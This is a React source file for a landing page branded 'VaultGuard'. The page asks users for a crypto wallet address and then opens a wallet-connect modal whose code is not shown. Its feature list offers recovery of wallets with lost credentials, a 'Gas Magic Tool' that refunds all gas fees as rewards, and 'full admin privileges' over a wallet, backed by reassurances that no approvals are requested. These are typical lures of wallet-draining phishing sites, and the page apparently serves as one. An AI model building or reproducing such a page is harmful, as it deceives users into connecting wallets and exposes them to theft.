import { useState } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { WalletConnectModal } from "@/components/wallet-connect-modal";
import {
  Shield,
  Wallet,
  Link2,
  AlertTriangle,
  Settings,
  Monitor,
  RefreshCw,
  ChevronRight,
  Sparkles,
  Flame,
  CheckCircle2,
  Info,
} from "lucide-react";
import { SiEthereum, SiBitcoin, SiSolana } from "react-icons/si";

const FEATURES = [
  {
    icon: RefreshCw,
    title: "Account Recovery",
    description: "Recover access to wallets with lost credentials using our secure multi-factor recovery system.",
    color: "from-violet-500/20 to-purple-500/10",
    iconColor: "text-violet-400",
    borderColor: "border-violet-500/20",
  },
  {
    icon: AlertTriangle,
    title: "Revoke Approvals",
    description: "Instantly revoke token approvals and permissions from dApps that may pose security risks.",
    color: "from-orange-500/20 to-red-500/10",
    iconColor: "text-orange-400",
    borderColor: "border-orange-500/20",
  },
  {
    icon: Link2,
    title: "DApp Connection",
    description: "Securely manage and monitor all connected decentralized applications from one dashboard.",
    color: "from-cyan-500/20 to-blue-500/10",
    iconColor: "text-cyan-400",
    borderColor: "border-cyan-500/20",
  },
  {
    icon: Flame,
    title: "Gas Magic Tool",
    description: "Track all gas fees spent and claim them back as rewards. Our newest tool just launched!",
    color: "from-yellow-500/20 to-orange-500/10",
    iconColor: "text-yellow-400",
    borderColor: "border-yellow-500/20",
    isNew: true,
  },
  {
    icon: Shield,
    title: "Validate Wallet",
    description: "Prove ownership and unlock advanced security features with cryptographic verification.",
    color: "from-green-500/20 to-emerald-500/10",
    iconColor: "text-green-400",
    borderColor: "border-green-500/20",
  },
  {
    icon: Settings,
    title: "Fix DApp Issues",
    description: "Diagnose and resolve connection issues, stuck transactions, and dApp compatibility problems.",
    color: "from-blue-500/20 to-indigo-500/10",
    iconColor: "text-blue-400",
    borderColor: "border-blue-500/20",
  },
  {
    icon: Monitor,
    title: "Admin Control Panel",
    description: "View all devices with your wallet logged in, remove unauthorized access, and get full admin privileges.",
    color: "from-pink-500/20 to-rose-500/10",
    iconColor: "text-pink-400",
    borderColor: "border-pink-500/20",
    isAdmin: true,
  },
];

function AnimatedOrb({ className }: { className?: string }) {
  return (
    <div className={`absolute rounded-full blur-3xl opacity-20 pointer-events-none ${className}`} />
  );
}

function FloatingParticle({ delay, size, x, y }: { delay: number; size: number; x: number; y: number }) {
  return (
    <div
      className="absolute rounded-full bg-violet-400/30 pointer-events-none animate-float"
      style={{
        width: size,
        height: size,
        left: `${x}%`,
        top: `${y}%`,
        animationDelay: `${delay}s`,
        animationDuration: `${3 + delay}s`,
      }}
    />
  );
}

export default function ConnectWallet() {
  const [, setLocation] = useLocation();
  const [address, setAddress] = useState("");
  const [error, setError] = useState("");
  const [showWalletModal, setShowWalletModal] = useState(false);

  const isValidAddress = (addr: string) => {
    return /^0x[a-fA-F0-9]{40}$/.test(addr) || /^[a-zA-Z0-9]{32,44}$/.test(addr);
  };

  const handleConnectClick = () => {
    if (!address.trim()) {
      setError("Please enter your wallet address to verify.");
      return;
    }
    if (!isValidAddress(address.trim())) {
      setError("Invalid wallet address format. Please check and try again.");
      return;
    }
    setError("");
    setShowWalletModal(true);
  };

  const handleWalletConnected = (verifiedAddress: string) => {
    sessionStorage.setItem("walletAddress", verifiedAddress);
    setShowWalletModal(false);
    setLocation("/dashboard");
  };

  const particles = [
    { delay: 0, size: 4, x: 10, y: 20 },
    { delay: 0.5, size: 6, x: 85, y: 15 },
    { delay: 1, size: 3, x: 70, y: 70 },
    { delay: 1.5, size: 5, x: 20, y: 80 },
    { delay: 2, size: 4, x: 50, y: 10 },
    { delay: 0.8, size: 3, x: 90, y: 55 },
  ];

  return (
    <div className="min-h-screen relative overflow-hidden mesh-bg bg-background flex flex-col">
      <AnimatedOrb className="w-[600px] h-[600px] bg-violet-600 -top-32 -left-32" />
      <AnimatedOrb className="w-[400px] h-[400px] bg-cyan-500 -bottom-20 -right-20" />
      <AnimatedOrb className="w-[300px] h-[300px] bg-purple-800 top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2" />

      {particles.map((p, i) => (
        <FloatingParticle key={i} {...p} />
      ))}

      <div className="fixed inset-x-0 h-px bg-gradient-to-r from-transparent via-violet-400/40 to-transparent pointer-events-none z-50 animate-scan" />

      {/* Header */}
      <header className="relative z-10 flex items-center justify-between px-6 py-5 border-b border-white/5">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 rounded-md bg-gradient-to-br from-violet-600 to-cyan-500 flex items-center justify-center glow-primary">
            <Shield className="w-5 h-5 text-white" />
          </div>
          <div>
            <span className="font-bold text-lg gradient-text tracking-tight">VaultGuard</span>
            <span className="text-muted-foreground text-xs ml-2 font-mono">v3.0</span>
          </div>
        </div>
        <div className="flex items-center gap-2">
          <div className="flex items-center gap-1.5 glass rounded-full px-3 py-1.5">
            <div className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
            <span className="text-xs text-muted-foreground font-mono">MAINNET</span>
          </div>
          <div className="flex items-center gap-1 glass rounded-md px-2 py-1">
            <SiEthereum className="w-3 h-3 text-violet-400" />
            <SiBitcoin className="w-3 h-3 text-yellow-400" />
            <SiSolana className="w-3 h-3 text-cyan-400" />
          </div>
        </div>
      </header>

      {/* Gas Magic Banner */}
      <div className="relative z-10 mx-4 mt-4">
        <div className="glass rounded-md border border-yellow-500/30 bg-gradient-to-r from-yellow-500/10 via-orange-500/5 to-transparent px-4 py-3 flex items-center gap-3">
          <div className="w-8 h-8 rounded-md bg-yellow-500/20 border border-yellow-500/30 flex items-center justify-center flex-shrink-0">
            <Flame className="w-4 h-4 text-yellow-400" />
          </div>
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-yellow-400 font-semibold text-sm">NEW FEATURE</span>
              <span className="text-xs glass rounded-full px-2 py-0.5 text-yellow-300 border border-yellow-500/20">Just Launched</span>
            </div>
            <p className="text-muted-foreground text-xs mt-0.5 truncate">
              Gas Magic Tool — Connect your wallet to track all gas fees & claim them back as rewards
            </p>
          </div>
          <Sparkles className="w-4 h-4 text-yellow-400 flex-shrink-0" />
        </div>
      </div>

      {/* Main */}
      <main className="relative z-10 flex-1 flex items-center justify-center px-4 py-8">
        <div className="w-full max-w-5xl grid grid-cols-1 lg:grid-cols-2 gap-8 items-start">

          {/* Left: Connect form */}
          <div className="flex flex-col gap-5">
            <div>
              <div className="inline-flex items-center gap-2 glass rounded-full px-3 py-1.5 mb-4 border border-violet-500/20">
                <div className="w-1.5 h-1.5 rounded-full bg-violet-400 animate-pulse" />
                <span className="text-xs text-violet-300 font-mono uppercase tracking-widest">Secure Access Portal</span>
              </div>
              <h1 className="text-4xl font-bold leading-tight mb-3">
                <span className="gradient-text glow-text-primary">Access Your</span>
                <br />
                <span className="text-foreground">Wallet Dashboard</span>
              </h1>
              <p className="text-muted-foreground text-base leading-relaxed">
                Enter your wallet address, then connect via your wallet app to verify ownership and access your full dashboard.
              </p>
            </div>

            {/* Connect card */}
            <div className="glass-card rounded-xl p-6 glow-primary">
              <div className="flex items-center gap-3 mb-5">
                <div className="w-10 h-10 rounded-md bg-violet-500/20 border border-violet-500/30 flex items-center justify-center">
                  <Wallet className="w-5 h-5 text-violet-400" />
                </div>
                <div>
                  <h2 className="font-semibold text-foreground">Connect Wallet</h2>
                  <p className="text-xs text-muted-foreground">Step 1 of 2 — Enter your address</p>
                </div>
              </div>

              {/* Step indicators */}
              <div className="flex items-center gap-2 mb-5">
                <div className="flex items-center gap-2 flex-1">
                  <div className="w-6 h-6 rounded-full bg-violet-600 flex items-center justify-center text-xs text-white font-bold flex-shrink-0">1</div>
                  <div className="flex-1 h-px bg-violet-500/40" />
                </div>
                <div className="flex items-center gap-2 flex-1">
                  <div className="w-6 h-6 rounded-full glass border border-white/20 flex items-center justify-center text-xs text-muted-foreground font-bold flex-shrink-0">2</div>
                  <div className="flex-1 h-px bg-white/10" />
                </div>
                <div className="w-6 h-6 rounded-full glass border border-white/20 flex items-center justify-center flex-shrink-0">
                  <CheckCircle2 className="w-3.5 h-3.5 text-muted-foreground/40" />
                </div>
              </div>
              <div className="flex justify-between text-xs text-muted-foreground/60 mb-5 -mt-3 px-1">
                <span className="text-violet-400">Enter Address</span>
                <span>Connect Wallet</span>
                <span>Dashboard</span>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="text-xs font-medium text-muted-foreground uppercase tracking-widest mb-2 block">
                    Your Wallet Address
                  </label>
                  <div className="relative">
                    <Input
                      data-testid="input-wallet-address"
                      placeholder="0x71C7656EC7ab88b098defB751B7401B5f6d8976F"
                      value={address}
                      onChange={(e) => {
                        setAddress(e.target.value);
                        setError("");
                      }}
                      onKeyDown={(e) => e.key === "Enter" && handleConnectClick()}
                      className="bg-white/5 border-white/10 text-foreground placeholder:text-muted-foreground/30 font-mono text-sm pr-10 focus:border-violet-500/50 focus:ring-violet-500/20"
                    />
                    {address && isValidAddress(address) && (
                      <CheckCircle2 className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-green-400" />
                    )}
                  </div>
                  {error && (
                    <p data-testid="text-address-error" className="text-destructive text-xs mt-1.5 flex items-center gap-1">
                      <AlertTriangle className="w-3 h-3" />
                      {error}
                    </p>
                  )}
                  <p className="text-xs text-muted-foreground/50 mt-1.5">
                    This will be cross-verified with your connected wallet in step 2
                  </p>
                </div>

                <Button
                  data-testid="button-access-wallet"
                  onClick={handleConnectClick}
                  className="w-full bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0"
                  size="lg"
                >
                  <Wallet className="w-4 h-4 mr-2" />
                  Continue — Choose Wallet
                  <ChevronRight className="w-4 h-4 ml-1" />
                </Button>

                <div className="flex items-center gap-3">
                  <div className="flex-1 h-px bg-white/5" />
                  <span className="text-xs text-muted-foreground/50">Supported networks</span>
                  <div className="flex-1 h-px bg-white/5" />
                </div>

                <div className="grid grid-cols-3 gap-2">
                  {[
                    { icon: SiEthereum, name: "Ethereum", color: "text-violet-400" },
                    { icon: SiBitcoin, name: "Bitcoin", color: "text-yellow-400" },
                    { icon: SiSolana, name: "Solana", color: "text-cyan-400" },
                  ].map(({ icon: Icon, name, color }) => (
                    <div key={name} className="glass rounded-md py-2 flex flex-col items-center gap-1 border border-white/5">
                      <Icon className={`w-4 h-4 ${color}`} />
                      <span className="text-xs text-muted-foreground">{name}</span>
                    </div>
                  ))}
                </div>
              </div>
            </div>

            <div className="flex items-start gap-2 glass rounded-md px-3 py-2.5 border border-blue-500/20">
              <Info className="w-4 h-4 text-blue-400 flex-shrink-0 mt-0.5" />
              <p className="text-xs text-muted-foreground leading-relaxed">
                Your address is read-only. We connect to your wallet solely to verify it matches your entered address. No transactions or approvals are requested.
              </p>
            </div>
          </div>

          {/* Right: Feature cards */}
          <div className="flex flex-col gap-4">
            <div className="flex items-center justify-between">
              <h3 className="text-sm font-semibold text-foreground uppercase tracking-widest">What You Can Do</h3>
              <div className="glass rounded-full px-2 py-1 border border-violet-500/20">
                <span className="text-xs text-violet-400 font-mono">{FEATURES.length} features</span>
              </div>
            </div>

            <div className="grid grid-cols-1 gap-3">
              {FEATURES.map((feature) => {
                const Icon = feature.icon;
                return (
                  <div
                    key={feature.title}
                    data-testid={`card-feature-${feature.title.toLowerCase().replace(/\s+/g, '-')}`}
                    className={`glass rounded-xl p-4 border ${feature.borderColor} bg-gradient-to-r ${feature.color} group cursor-default hover-elevate`}
                  >
                    <div className="flex items-start gap-3">
                      <div className={`w-8 h-8 rounded-md glass flex items-center justify-center flex-shrink-0 ${feature.borderColor} border`}>
                        <Icon className={`w-4 h-4 ${feature.iconColor}`} />
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 flex-wrap mb-0.5">
                          <span className="font-semibold text-sm text-foreground">{feature.title}</span>
                          {feature.isNew && (
                            <span className="text-xs bg-yellow-500/20 border border-yellow-500/30 text-yellow-300 rounded-full px-2 py-0.5 font-mono">NEW</span>
                          )}
                          {feature.isAdmin && (
                            <span className="text-xs bg-pink-500/20 border border-pink-500/30 text-pink-300 rounded-full px-2 py-0.5 font-mono">ADMIN</span>
                          )}
                        </div>
                        <p className="text-xs text-muted-foreground leading-relaxed">{feature.description}</p>
                      </div>
                      <ChevronRight className="w-4 h-4 text-muted-foreground/30 flex-shrink-0 group-hover:text-muted-foreground/60 transition-colors" />
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="relative z-10 border-t border-white/5 px-6 py-4 flex items-center justify-between">
        <span className="text-xs text-muted-foreground/40 font-mono">VaultGuard © 2026 — Web3 Security Platform</span>
        <div className="flex items-center gap-4">
          <span className="text-xs text-muted-foreground/40">Powered by WalletConnect v3</span>
          <div className="flex items-center gap-1">
            <div className="w-1.5 h-1.5 rounded-full bg-green-400/60 animate-pulse" />
            <span className="text-xs text-green-400/60 font-mono">SECURED</span>
          </div>
        </div>
      </footer>

      {/* Wallet connect modal */}
      {showWalletModal && (
        <WalletConnectModal
          enteredAddress={address.trim()}
          onSuccess={handleWalletConnected}
          onClose={() => setShowWalletModal(false)}
        />
      )}
    </div>
  );
}
